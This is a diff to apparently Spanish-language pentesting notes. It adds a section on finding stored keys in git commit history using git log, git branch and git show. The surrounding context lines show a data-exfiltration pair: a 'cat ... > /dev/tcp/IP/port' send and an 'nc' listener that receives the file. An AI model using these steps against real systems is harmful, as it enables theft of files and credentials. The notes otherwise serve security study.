@@ -145,6 +145,28 @@ cat out.txt > /dev/tcp/IP/port
 
 nc -lvpn port > out.txt
 ```
+
+## Github
+
+Puede ser que se guarden claves en los diferentes commits que se hacen en un proyecto de git.
+
+```
+#Para ver toda la actividad
+
+git log
+
+## Para ver las ramas
+
+git branch
+
+# Para ver los cambios en un commit en especifico
+
+git show <commit-hash>
+
+
+```
+
+
 ## Linux capabliities
 
 
